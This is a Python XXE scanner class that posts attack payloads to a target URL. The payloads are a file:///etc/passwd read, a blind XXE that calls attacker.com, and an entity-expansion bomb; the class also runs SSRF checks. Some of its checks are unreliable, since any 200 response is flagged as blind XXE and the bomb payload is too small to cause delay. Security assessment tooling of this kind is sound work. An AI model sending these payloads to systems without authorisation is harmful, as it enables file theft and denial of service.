"""XXE Vulnerability Scanner"""
import requests
from datetime import datetime
from modules.ssrf_tester import SSRFTester

class XXEScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []
        self.ssrf_tester = SSRFTester()
    
    def scan(self):
        self._test_basic_xxe()
        self._test_blind_xxe()
        self._test_billion_laughs()
        self._test_ssrf()
        return {
            "target_url": self.target_url,
            "vulnerabilities": self.vulnerabilities,
            "vulnerability_count": len(self.vulnerabilities),
            "scan_date": datetime.now().strftime("%d %b %Y %H:%M:%S")
        }
    
    def _test_basic_xxe(self):
        """Test basic XXE"""
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'''
        
        try:
            response = requests.post(
                self.target_url,
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=5
            )
            if ('root:' in response.text or '/bin/' in response.text) and self._verify_xxe(response):
                self.vulnerabilities.append({
                    "type": "XXE Vulnerability",
                    "severity": "CRITICAL",
                    "cwe": "CWE-611",
                    "description": "XML External Entity injection detected",
                    "cvss": 9.1,
                    "remediation": "Disable external entities in XML parser. Use safe XML parsers. Validate and sanitize XML input."
                })
        except:
            pass
    
    def _verify_xxe(self, response) -> bool:
        """Verify XXE by checking for file content patterns"""
        xxe_indicators = ['root:', '/bin/', '/usr/', 'daemon:', 'nobody:']
        return any(indicator in response.text for indicator in xxe_indicators)
    
    def _test_blind_xxe(self):
        """Test blind XXE"""
        blind_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<root><data>&xxe;</data></root>'''
        
        try:
            response = requests.post(
                self.target_url,
                data=blind_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=5
            )
            if response.status_code == 200:
                self.vulnerabilities.append({
                    "type": "Potential Blind XXE",
                    "severity": "HIGH",
                    "cwe": "CWE-611",
                    "description": "XML parser may be vulnerable to blind XXE",
                    "cvss": 7.5
                })
        except:
            pass
    
    def _test_billion_laughs(self):
        """Test billion laughs attack"""
        billion_laughs = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<root><data>&lol2;</data></root>'''
        
        try:
            response = requests.post(
                self.target_url,
                data=billion_laughs,
                headers={'Content-Type': 'application/xml'},
                timeout=5
            )
            if response.elapsed.total_seconds() > 3:
                self.vulnerabilities.append({
                    "type": "XML Bomb Vulnerability",
                    "severity": "HIGH",
                    "cwe": "CWE-776",
                    "description": "Server vulnerable to XML bomb (billion laughs)",
                    "cvss": 7.5
                })
        except:
            pass
    
    def _test_ssrf(self):
        """Test for SSRF vulnerabilities"""
        ssrf_vulns = self.ssrf_tester.test_ssrf(self.target_url)
        self.vulnerabilities.extend(ssrf_vulns)
        
        blind_ssrf_vulns = self.ssrf_tester.test_blind_ssrf(self.target_url)
        self.vulnerabilities.extend(blind_ssrf_vulns)
